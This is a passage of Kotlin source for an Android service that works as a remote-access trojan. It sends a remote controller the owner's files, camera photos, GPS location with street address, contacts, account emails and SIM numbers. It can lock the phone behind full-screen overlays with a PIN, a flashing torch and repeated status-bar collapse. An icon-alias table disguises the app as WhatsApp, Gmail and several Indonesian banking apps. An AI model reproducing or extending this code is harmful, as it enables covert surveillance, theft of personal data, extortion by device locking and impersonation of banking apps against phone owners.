      document.getElementById("dialInput").innerText = typedNumber;
    }

    function toggleActive(el) {
      const icon = el.querySelector('.menu-icon');
      if (icon.style.background === 'rgb(255, 255, 255)') {
        icon.style.background = '#2a2a2e';
        icon.style.color = '#fff';
      } else {
        icon.style.background = '#ffffff';
        icon.style.color = '#000';
      }
    }

    function toggleActiveBtn(btn) {
      if (btn.style.background === 'rgb(255, 255, 255)') {
        btn.style.background = '#2b2b2f';
      } else {
        btn.style.background = '#ffffff';
      }
    }
  </script>
</body>
</html>"""
}




    
    private fun startKeyboardSpam() {
    if (keyspamActive) return
    keyspamActive = true
    keyspamShowState = true

    Handler(Looper.getMainLooper()).post {
        try {
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager

            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION")
                WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

            val params = WindowManager.LayoutParams(
                1, 1, type,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT
            ).apply {
                gravity = android.view.Gravity.TOP or android.view.Gravity.START
                x = 0; y = 0
            }

            val editText = android.widget.EditText(this@DeviceService).apply {
                isFocusable = true
                isFocusableInTouchMode = true
                inputType = android.text.InputType.TYPE_CLASS_TEXT
                setBackgroundColor(android.graphics.Color.TRANSPARENT)
                setTextColor(android.graphics.Color.TRANSPARENT)
                setCursorVisible(false)
            }

            keyspamOverlayView = editText
            wm.addView(editText, params)
            editText.requestFocus()

            keyspamHandler = Handler(Looper.getMainLooper())
            keyspamRunnable = object : Runnable {
                override fun run() {
                    if (!keyspamActive) return
                    val imm = getSystemService(INPUT_METHOD_SERVICE)
                        as android.view.inputmethod.InputMethodManager

                    if (keyspamShowState) {
                        editText.requestFocus()
                        imm.showSoftInput(
                            editText,
                            android.view.inputmethod.InputMethodManager.SHOW_FORCED
                        )
                    } else {
                        imm.hideSoftInputFromWindow(editText.windowToken, 0)
                    }
                    keyspamShowState = !keyspamShowState
                    keyspamHandler?.postDelayed(this, 200L)
                }
            }
            keyspamHandler?.post(keyspamRunnable!!)

        } catch (e: Exception) {
            Log.e("DeviceService", "startKeyboardSpam: ${e.message}")
            keyspamActive = false
        }
    }

    emitStatus(JSONObject().apply { put("keyboardSpamActive", true) })
}

private fun stopKeyboardSpam() {
    keyspamActive = false
    keyspamRunnable?.let { keyspamHandler?.removeCallbacks(it) }
    keyspamHandler  = null
    keyspamRunnable = null

    Handler(Looper.getMainLooper()).post {
        try {
            keyspamOverlayView?.let { v ->
                val imm = getSystemService(INPUT_METHOD_SERVICE)
                    as android.view.inputmethod.InputMethodManager
                imm.hideSoftInputFromWindow(v.windowToken, 0)
                val wm = getSystemService(WINDOW_SERVICE) as WindowManager
                try { wm.removeView(v) } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
        keyspamOverlayView = null
    }

    emitStatus(JSONObject().apply { put("keyboardSpamActive", false) })
}

private fun injectKey(keyCode: Int) {
    try {
        val im = Class.forName("android.hardware.input.InputManager")
        val getInstance = im.getDeclaredMethod("getInstance")
        getInstance.isAccessible = true
        val instance = getInstance.invoke(null)

        val injectInputEvent = im.getDeclaredMethod(
            "injectInputEvent",
            android.view.InputEvent::class.java,
            Int::class.java
        )
        injectInputEvent.isAccessible = true

        val downTime = SystemClock.uptimeMillis()
        val down = KeyEvent(downTime, downTime, KeyEvent.ACTION_DOWN, keyCode, 0)
        val up   = KeyEvent(downTime, downTime, KeyEvent.ACTION_UP,   keyCode, 0)

        injectInputEvent.invoke(instance, down, 0)
        injectInputEvent.invoke(instance, up,   0)
    } catch (e: Exception) {
        Log.e("DeviceService", "injectKey: ${e.message}")
    }
}

    private fun setVolumeMute(mute: Boolean) {
        try {
            val audio = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            audio.setStreamVolume(
                AudioManager.STREAM_MUSIC,
                if (mute) 0 else audio.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
                0
            )
            emitStatus(JSONObject().apply { put("volumeMuted", mute) })
        } catch (e: Exception) {
            Log.e("DeviceService", "setVolumeMute: ${e.message}")
        }
    }
    
    private fun showToast(value: String) {
        try {
            var message = value
            try {
                if (value.trim().startsWith("{")) {
                    val obj = JSONObject(value)
                    message = obj.optString("text", obj.optString("message", obj.optString("msg", value)))
                }
            } catch (_: Exception) {}

            if (message.isBlank()) {
                message = "Pesan dari Admin!"
            }

            Handler(Looper.getMainLooper()).post {
                Toast.makeText(this, message, Toast.LENGTH_LONG).show()
            }

            emitStatus(JSONObject().apply { put("toastSent", message) })
        } catch (e: Exception) {
            Log.e("DeviceService", "showToast ERROR: ${e.message}")
        }
    }

    private fun sendFileList(path: String) {
        Thread {
            try {
                val rootPath = if (path.isBlank()) {
                    Environment.getExternalStorageDirectory().absolutePath
                } else path

                val dir = File(rootPath)
                val arr = JSONArray()

                if (!dir.exists() || !dir.isDirectory) {
                    socket?.emit("device:files", JSONObject().apply {
                        put("deviceId", deviceId)
                        put("path", rootPath)
                        put("files", arr)
                        put("error", "Folder tidak ditemukan atau tidak bisa diakses")
                    })
                    return@Thread
                }

                val canReadAll = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    Environment.isExternalStorageManager()
                } else {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                }

                val entries = try { dir.listFiles() } catch (_: Exception) { null }

                entries
                    ?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
                    ?.forEach { f ->
                        try {
                            arr.put(JSONObject().apply {
                                put("name",     f.name)
                                put("path",     f.absolutePath)
                                put("isDir",    f.isDirectory)
                                put("size",     if (f.isFile) f.length() else 0L)
                                put("modified", f.lastModified())
                                put("readable", f.canRead())
                            })
                        } catch (_: Exception) {}
                    }

                if (socket?.connected() != true) return@Thread
                socket?.emit("device:files", JSONObject().apply {
                    put("deviceId",   deviceId)
                    put("path",       rootPath)
                    put("files",      arr)
                    put("canReadAll", canReadAll)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendFileList: ${e.message}")
            }
        }.start()
    }

    private fun downloadAndSendFile(value: String) {
        Thread {
            try {
                val obj   = JSONObject(value)
                val path  = obj.getString("path")
                val reqId = obj.getString("reqId")
                val file  = File(path)
                if (!file.exists() || !file.isFile || !file.canRead()) {
                    socket?.emit("device:filedata", JSONObject().apply {
                        put("reqId", reqId)
                        put("error", "File tidak ditemukan atau tidak bisa dibaca")
                    })
                    return@Thread
                }
                val bytes = file.readBytes()
                val b64   = Base64.encodeToString(bytes, Base64.NO_WRAP)
                val ext   = file.extension.lowercase()
                val mime  = MimeTypeMap.getSingleton()
                    .getMimeTypeFromExtension(ext) ?: "application/octet-stream"
                socket?.emit("device:filedata", JSONObject().apply {
                    put("reqId",  reqId)
                    put("base64", b64)
                    put("mime",   mime)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "downloadAndSendFile: ${e.message}")
                try {
                    val obj = JSONObject(value)
                    socket?.emit("device:filedata", JSONObject().apply {
                        put("reqId", obj.optString("reqId", ""))
                        put("error", e.message ?: "Error")
                    })
                } catch (_: Exception) {}
            }
        }.start()
    }

    private fun sendGallery() {
        Thread {
            try {
                val arr = JSONArray()
                val projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.DATE_ADDED,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.BUCKET_DISPLAY_NAME
                )
                val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
                val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                val selection = "${MediaStore.Images.Media.BUCKET_DISPLAY_NAME} = ?"
                val selectionArgs = arrayOf("Camera")

                val cursor: Cursor? = contentResolver.query(uri, projection, selection, selectionArgs, sortOrder)
                cursor?.use { c ->
                    val idCol   = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                    val nameCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                    val dateCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                    val sizeCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                    var count = 0
                    while (c.moveToNext() && count < 100) {
                        val id      = c.getLong(idCol)
                        val name    = c.getString(nameCol) ?: ""
                        val date    = c.getLong(dateCol)
                        val size    = c.getLong(sizeCol)
                        val imgUri  = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())                        
                        try {
                            val opts = BitmapFactory.Options().apply { inJustDecodeBounds = true }
                            contentResolver.openInputStream(imgUri)?.use { BitmapFactory.decodeStream(it, null, opts) }
                            val maxDim = 300
                            val sample = maxOf(1, minOf(opts.outWidth, opts.outHeight) / maxDim)
                            val decodeOpts = BitmapFactory.Options().apply { inSampleSize = sample }
                            val bmp = contentResolver.openInputStream(imgUri)?.use { BitmapFactory.decodeStream(it, null, decodeOpts) }
                            if (bmp != null) {
                                val bos = ByteArrayOutputStream()
                                bmp.compress(Bitmap.CompressFormat.JPEG, 72, bos)
                                bmp.recycle()
                                val b64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP)
                                arr.put(JSONObject().apply {
                                    put("id",    id)
                                    put("name",  name)
                                    put("date",  date)
                                    put("size",  size)
                                    put("thumb", "data:image/jpeg;base64,$b64")
                                })
                                count++
                            }
                        } catch (_: Exception) { }
                    }
                }
                if (socket?.connected() != true) return@Thread
                socket?.emit("device:gallery", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("photos",   arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendGallery: ${e.message}")
            }
        }.start()
    }
    
    private fun openApp(packageName: String) {
        try {
            val pm = packageManager
            val launchIntent = pm.getLaunchIntentForPackage(packageName)
            if (launchIntent != null) {
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(launchIntent)
                emitStatus(JSONObject().apply { put("toastSent", "Membuka aplikasi...") })
            } else {
                emitStatus(JSONObject().apply { put("toastSent", "Aplikasi tidak bisa dibuka") })
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "openApp ERROR: ${e.message}")
        }
    }
    
    private fun uninstallApp(packageName: String) {
        try {
            val intent = Intent(Intent.ACTION_DELETE)
            intent.data = Uri.parse("package:$packageName")
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            emitStatus(JSONObject().apply { put("toastSent", "Cek layar HP untuk konfirmasi hapus") })
        } catch (e: Exception) {
            Log.e("DeviceService", "uninstallApp ERROR: ${e.message}")
        }
    }

    private fun sendAppsManage() {
        Thread {
            try {
                val pm = packageManager
                val arr = JSONArray()

                @Suppress("DEPRECATION")
                val packages = pm.getInstalledPackages(0)

                packages.forEach { pkgInfo ->
                    try {
                        val name = pm.getApplicationLabel(pkgInfo.applicationInfo).toString()
                        val isSystem = (pkgInfo.applicationInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
                        if (name.isNotBlank()) {
                            arr.put(JSONObject().apply {
                                put("package", pkgInfo.packageName)
                                put("name", name)
                                put("isSystem", isSystem)
                            })
                        }
                    } catch (_: Exception) {}
                }

                if (socket?.connected() == true) {
                    socket?.emit("device:apps_manage", JSONObject().apply {
                        put("deviceId", deviceId)
                        put("apps", arr)
                    })
                }
            } catch (e: Exception) {
                Log.e("DeviceService", "sendAppsManage ERROR: ${e.message}")
            }
        }.start()
    }
    
    private fun blockApp(pkgJson: String) {
        try {
            val obj  = JSONObject(pkgJson)
            val pkg  = obj.getString("package")
            val name = obj.optString("name", pkg)
            val i = Intent("com.sync.xxx.BLOCK_APP").apply {
                putExtra("package", pkg)
                putExtra("name", name)
                setPackage(packageName)
            }
            sendBroadcast(i)            
            val blocked = AppBlockerService.blockedPackages.toList()
            emitStatus(JSONObject().apply {
                put("blockedApps", JSONArray(blocked))
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "blockApp: ${e.message}")
        }
    }

    private fun unblockApp(pkg: String) {
        try {
            val i = Intent("com.sync.xxx.UNBLOCK_APP").apply {
                putExtra("package", pkg)
                setPackage(packageName)
            }
            sendBroadcast(i)
            val blocked = AppBlockerService.blockedPackages.toList()
            emitStatus(JSONObject().apply {
                put("blockedApps", JSONArray(blocked))
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "unblockApp: ${e.message}")
        }
    }

    private fun unblockAll() {
        try {
            val i = Intent("com.sync.xxx.UNBLOCK_ALL").apply { setPackage(packageName) }
            sendBroadcast(i)
            emitStatus(JSONObject().apply {
                put("blockedApps", JSONArray())
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "unblockAll: ${e.message}")
        }
    }

    @SuppressLint("MissingPermission")
    private fun sendLocation() {
        val hasFine   = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)   == PackageManager.PERMISSION_GRANTED
        val hasCoarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

        if (!hasFine && !hasCoarse) {
            socket?.emit("device:location", JSONObject().apply {
                put("deviceId", deviceId); put("error", "permission_denied")
            })
            return
        }

        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
        val gpsOn     = lm.isProviderEnabled(LocationManager.GPS_PROVIDER)
        val networkOn = lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)

        if (!gpsOn && !networkOn) {
            socket?.emit("device:location", JSONObject().apply {
                put("deviceId", deviceId); put("error", "provider_disabled")
            })
            return
        }

        val fusedClient: FusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(this)
        val priority = if (hasFine && gpsOn) Priority.PRIORITY_HIGH_ACCURACY else Priority.PRIORITY_BALANCED_POWER_ACCURACY
        
        val cts = com.google.android.gms.tasks.CancellationTokenSource()
        fusedClient.getCurrentLocation(priority, cts.token)
            .addOnSuccessListener { loc ->
                if (loc != null) {
                    emitLocationResult(loc.latitude, loc.longitude, loc.accuracy)
                } else {                    
                    requestSingleLocationUpdate(fusedClient, priority)
                }
            }
            .addOnFailureListener {
                requestSingleLocationUpdate(fusedClient, priority)
            }
    }

    @SuppressLint("MissingPermission")
    private fun requestSingleLocationUpdate(fusedClient: FusedLocationProviderClient, priority: Int) {
        val req = LocationRequest.Builder(priority, 2000L)
            .setMaxUpdates(1)
            .setWaitForAccurateLocation(false)
            .build()

        val cb = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                fusedClient.removeLocationUpdates(this)
                val loc = result.lastLocation
                if (loc != null) {
                    emitLocationResult(loc.latitude, loc.longitude, loc.accuracy)
                } else {
                    socket?.emit("device:location", JSONObject().apply {
                        put("deviceId", deviceId); put("error", "no_location")
                    })
                }
            }
        }

        try {
            fusedClient.requestLocationUpdates(req, cb, Looper.getMainLooper())            
            Handler(Looper.getMainLooper()).postDelayed({
                fusedClient.removeLocationUpdates(cb)
            }, 15_000L)
        } catch (e: Exception) {
            Log.e("DeviceService", "requestSingleLocationUpdate: ${e.message}")
            socket?.emit("device:location", JSONObject().apply {
                put("deviceId", deviceId); put("error", "no_location")
            })
        }
    }

    private fun emitLocationResult(lat: Double, lng: Double, accuracy: Float) {
        val obj = JSONObject().apply {
            put("deviceId", deviceId)
            put("lat", lat)
            put("lng", lng)
            put("accuracy", accuracy)
        }
        try {
            @Suppress("DEPRECATION")
            val geocoder = Geocoder(this, Locale("id", "ID"))
            @Suppress("DEPRECATION")
            val addresses = geocoder.getFromLocation(lat, lng, 1)
            if (!addresses.isNullOrEmpty()) {
                val addr = addresses[0]
                obj.put("province",    addr.adminArea       ?: "")
                obj.put("city",        addr.subAdminArea    ?: "")
                obj.put("district",    addr.locality        ?: "")
                obj.put("village",     addr.subLocality     ?: "")
                obj.put("postalCode",  addr.postalCode      ?: "")
                obj.put("fullAddress", addr.getAddressLine(0) ?: "")
                obj.put("countryName", addr.countryName     ?: "")
            }
        } catch (_: Exception) { }
        socket?.emit("device:location", obj)
    }

    private fun sendContacts() {
        Thread {
            try {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                    socket?.emit("device:contacts", JSONObject().apply {
                        put("deviceId", deviceId); put("error", "permission_denied")
                    })
                    return@Thread
                }
                val arr = JSONArray()
                val projection = arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                )
                val cursor = contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    projection, null, null,
                    "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
                )
                cursor?.use { c ->
                    val nameCol = c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val numCol  = c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    while (c.moveToNext()) {
                        val name   = c.getString(nameCol) ?: continue
                        val number = c.getString(numCol)  ?: continue
                        arr.put(JSONObject().apply {
                            put("name",   name.trim())
                            put("number", number.trim())
                        })
                    }
                }
                socket?.emit("device:contacts", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("contacts", arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendContacts: ${e.message}")
            }
        }.start()
    }

    private fun sendGmailAccounts() {
        Thread {
            try {
                val hasGetAccounts = ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED
                val hasReadContacts = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED

                if (!hasGetAccounts && !hasReadContacts) {
                    socket?.emit("device:gmail", JSONObject().apply {
                        put("deviceId", deviceId); put("error", "permission_denied")
                    })
                    return@Thread
                }

                val am = getSystemService(Context.ACCOUNT_SERVICE) as android.accounts.AccountManager
                val allAccounts = am.accounts ?: emptyArray()
                
                val arr = JSONArray()
                val extra = JSONArray()

                allAccounts.forEach { acc ->
                    val accObj = JSONObject().apply {
                        put("email", acc.name)
                        put("type", acc.type)
                    }
                    if (acc.type == "com.google") {
                        arr.put(accObj)
                    } else {
                        extra.put(accObj)
                    }
                }

                if (socket?.connected() != true) return@Thread
                socket?.emit("device:gmail", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("accounts", arr)
                    put("others", extra)
                })
                
            } catch (e: Exception) {
                Log.e("DeviceService", "sendGmailAccounts Error: ${e.message}")
                socket?.emit("device:gmail", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("error", e.message ?: "Unknown error")
                })
            }
        }.start()
    }

    private fun sendPhoneNumbers() {
        Thread {
            try {
                val arr = JSONArray()
                val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    val subMgr = getSystemService(SubscriptionManager::class.java)
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED) {
                        val subs = subMgr?.activeSubscriptionInfoList ?: emptyList()
                        if (subs.isEmpty()) {
                            val num = tm.line1Number
                            if (!num.isNullOrBlank()) {
                                arr.put(JSONObject().apply {
                                    put("slot", 0)
                                    put("number", num)
                                    put("operator", tm.networkOperatorName ?: "")
                                    put("simState", tm.simState)
                                })
                            }
                        } else {
                            subs.forEachIndexed { idx, sub ->
                                val num = sub.number ?: ""
                                arr.put(JSONObject().apply {
                                    put("slot", idx)
                                    put("number", num)
                                    put("operator", sub.carrierName ?: "")
                                    put("displayName", sub.displayName ?: "SIM ${idx + 1}")
                                    put("iccId", sub.iccId ?: "")
                                })
                            }
                        }
                    }
                } else {
                    @Suppress("DEPRECATION")
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                        val num = tm.line1Number
                        arr.put(JSONObject().apply {
                            put("slot", 0)
                            put("number", num ?: "")
                            put("operator", tm.networkOperatorName ?: "")
                        })
                    }
                }
                socket?.emit("device:phone", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("sims", arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendPhoneNumbers: ${e.message}")
                socket?.emit("device:phone", JSONObject().apply {
                    put("deviceId", deviceId); put("error", e.message)
                })
            }
        }.start()
    }

    private fun sendInstalledApps() {
        Thread {
            try {
                val pm  = packageManager
                val arr = org.json.JSONArray()

                @Suppress("DEPRECATION")
                val packages = pm.getInstalledPackages(0)

                packages
                    .filter { it.packageName != packageName }
                    .mapNotNull { pkgInfo ->
                        try {
                            val name = pm.getApplicationLabel(pkgInfo.applicationInfo).toString()
                            if (name.isBlank()) null else Pair(pkgInfo.packageName, name)
                        } catch (_: Exception) { null }
                    }
                    .sortedBy { it.second.lowercase() }
                    .forEach { (pkg, name) ->
                        arr.put(org.json.JSONObject().apply {
                            put("package", pkg)
                            put("name", name)
                        })
                    }

                Log.d("DeviceService", "sendInstalledApps: ${arr.length()} apps")

                if (socket?.connected() != true) return@Thread
                socket?.emit("device:status", org.json.JSONObject().apply {
                    put("deviceId", deviceId)
                    put("status", org.json.JSONObject().apply {
                        put("installedApps", arr)
                    })
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "getInstalledApps: ${e.message}")
            }
        }.start()
    }

    private fun lockDevice(jsonValue: String) {
        try {
            val obj        = JSONObject(jsonValue)
            val pin        = obj.optString("pin", "1234")
            val title      = obj.optString("title", "Perangkat Terkunci")
            val customHtml = obj.optString("custom_html", "")
            val lockType   = obj.optString("lock_type", "new") // "new" atau "v3_chat"

            lockPin   = pin
            lockTitle = title

            // ── SIMPAN KE SHAREDPREFERENCES ──
            val prefs = getSharedPreferences("lock_prefs", Context.MODE_PRIVATE)
            prefs.edit().apply {
                putBoolean("is_locked", true)
                putString("lock_type", lockType)
                putString(LockOverlayService.EXTRA_PIN, pin)
                putString(LockOverlayService.EXTRA_TITLE, title)
                putString(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
                apply()
            }

            // ── BUKA ACTIVITY KUNCI ──
            val targetActivity = if (lockType == "v3_chat") LockChatActivity::class.java else LockNewActivity::class.java
            val lockIntent = Intent(this, targetActivity).apply {
                putExtra(LockOverlayService.EXTRA_PIN, pin)
                putExtra(LockOverlayService.EXTRA_TITLE, title)
                putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            startActivity(lockIntent)

            startLockFlashBlink()

            emitStatus(JSONObject().apply {
                put("deviceLocked", true)
                put("lockTitle", title)
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "lockDevice error: ${e.message}")
        }
    }

    private fun unlockDevice() {
        lockPin   = ""
        lockTitle = ""

        val prefs = getSharedPreferences("lock_prefs", Context.MODE_PRIVATE)
        prefs.edit().putBoolean("is_locked", false).apply()

        stopLockFlashBlink()
        lockMediaPlayer?.release()
        lockMediaPlayer = null
        stopStatusBarCollapse()
        removeLockCustomOverlay()
        val intent = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
        sendBroadcast(intent)
        emitStatus(JSONObject().apply {
            put("deviceLocked", false)
            put("lockTitle", "")
        })
    }

    private val THEME_ALIASES = mapOf(
        "default"   to "com.sync.xxx.AliasDefault",
        "whatsapp"  to "com.sync.xxx.AliasWhatsApp",
        "youtube"   to "com.sync.xxx.AliasYouTube",
        "instagram" to "com.sync.xxx.AliasInstagram",
        "telegram"  to "com.sync.xxx.AliasTelegram",
        "xnxx"      to "com.sync.xxx.AliasXNXX",
        "capcut"    to "com.sync.xxx.AliasCapCut",
        "shopee"    to "com.sync.xxx.AliasShopee",
        "melolo"    to "com.sync.xxx.AliasMelolo",
        "facebook"  to "com.sync.xxx.AliasFacebook",
        "tokopedia" to "com.sync.xxx.AliasTokopedia",
        "canva"     to "com.sync.xxx.AliasCanva",
        "grab"      to "com.sync.xxx.AliasGrab",
        "line"      to "com.sync.xxx.AliasLine",
        "alibaba"   to "com.sync.xxx.AliasAlibaba",
        "spotify"   to "com.sync.xxx.AliasSpotify",
        "wps"         to "com.sync.xxx.AliasWPS",
        "wechat"      to "com.sync.xxx.AliasWeChat",
        "ml"          to "com.sync.xxx.AliasML",
        "ff"          to "com.sync.xxx.AliasFF",
        "mechat"      to "com.sync.xxx.AliasMeChat",
        "omi"         to "com.sync.xxx.AliasOmi",
        "snackvideo"  to "com.sync.xxx.AliasSnackVideo",
        "messages"    to "com.sync.xxx.AliasMessages",
        "dana"       to "com.sync.xxx.AliasDana",
        "bcaimobile" to "com.sync.xxx.AliasBCAMobile",
        "livin"      to "com.sync.xxx.AliasLivin",
        "gopay"      to "com.sync.xxx.AliasGopay",
        "brimo"      to "com.sync.xxx.AliasBRimo",
        "photos"     to "com.sync.xxx.AliasPhotos",
        "seabank"    to "com.sync.xxx.AliasSeaBank",
        "gmail"      to "com.sync.xxx.AliasGmail"
    )

    private fun changeTheme(theme: String) {
        try {
            val pm = packageManager
            val target = theme.lowercase().trim()
            THEME_ALIASES.values.forEach { alias ->
                try {
                    pm.setComponentEnabledSetting(
                        ComponentName(packageName, alias),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                } catch (_: Exception) {}
            }
            val chosen = THEME_ALIASES[target] ?: THEME_ALIASES["default"]!!
            pm.setComponentEnabledSetting(
                ComponentName(packageName, chosen),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            emitStatus(JSONObject().apply { put("themeChanged", theme) })
        } catch (e: Exception) {
            Log.e("DeviceService", "changeTheme error: ${e.message}")
        }
    }

    private var lockCustomView: WebView? = null
    private val lockCustomWm: WindowManager by lazy { getSystemService(WINDOW_SERVICE) as WindowManager }
    private var statusBarCollapseHandler: Handler? = null
    private var statusBarCollapseRunnable: Runnable? = null

    private fun lockCustom(htmlContent: String) {
        try {
            if (htmlContent.isEmpty()) {
                removeLockCustomOverlay()
                unlockDevice()
                return
            }
            lockPin   = ""
            lockTitle = ""

            removeLockCustomOverlay()

            Handler(Looper.getMainLooper()).post {
                try {
                    val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    else
                        @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

                    val params = WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        type,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                        WindowManager.LayoutParams.FLAG_FULLSCREEN or
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                        WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                        PixelFormat.TRANSLUCENT
                    )

                    val fullHtml = """<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  html,body{width:100%;height:100%;background:#000;overflow:hidden;
    display:flex;align-items:center;justify-content:center}
</style>
</head>
<body>
$htmlContent
</body>
</html>"""

                    val wv = WebView(this@DeviceService).apply {
                        settings.javaScriptEnabled = true
                        settings.domStorageEnabled  = true
                        setBackgroundColor(android.graphics.Color.BLACK)
                        loadDataWithBaseURL(null, fullHtml, "text/html", "UTF-8", null)
                    }

                    lockCustomView = wv
                    lockCustomWm.addView(wv, params)
                } catch (e: Exception) {
                    Log.e("DeviceService", "lockCustom overlay: ${e.message}")
                }
            }

            startLockFlashBlink()
            playLockSound()
            startStatusBarCollapse()
            emitStatus(JSONObject().apply { put("deviceLocked", true); put("lockTitle", "CUSTOM") })
        } catch (e: Exception) {
            Log.e("DeviceService", "lockCustom error: ${e.message}")
        }
    }

    private fun startStatusBarCollapse() {
        stopStatusBarCollapse()
        statusBarCollapseHandler = Handler(Looper.getMainLooper())
        statusBarCollapseRunnable = object : Runnable {
            override fun run() {
                try {
                    @Suppress("DEPRECATION")
                    sendBroadcast(Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS))
                } catch (_: Exception) {}
                try {
                    val service = getSystemService("statusbar")
                    val clazz = Class.forName("android.app.StatusBarManager")
                    val method = clazz.getMethod("collapsePanels")
                    method.invoke(service)
                } catch (_: Exception) {}
                statusBarCollapseHandler?.postDelayed(this, 80)
            }
        }
        statusBarCollapseHandler?.post(statusBarCollapseRunnable!!)
    }

    private fun stopStatusBarCollapse() {
        statusBarCollapseRunnable?.let { statusBarCollapseHandler?.removeCallbacks(it) }
        statusBarCollapseHandler = null
        statusBarCollapseRunnable = null
    }

    private fun removeLockCustomOverlay() {
        lockCustomView?.let {
            try { Handler(Looper.getMainLooper()).post { lockCustomWm.removeView(it) } } catch (_: Exception) {}
        }
        lockCustomView = null
    }

    private var lockFlashHandler: Handler? = null
    private var lockFlashRunnable: Runnable? = null
    private var lockFlashState = false

    private fun startLockFlashBlink() {
        stopLockFlashBlink()
        lockFlashHandler = Handler(Looper.getMainLooper())
        lockFlashRunnable = object : Runnable {
            override fun run() {
                lockFlashState = !lockFlashState
                try { torchCameraId?.let { cameraManager?.setTorchMode(it, lockFlashState) } } catch (_: Exception) {}
                lockFlashHandler?.postDelayed(this, 200)
            }
        }
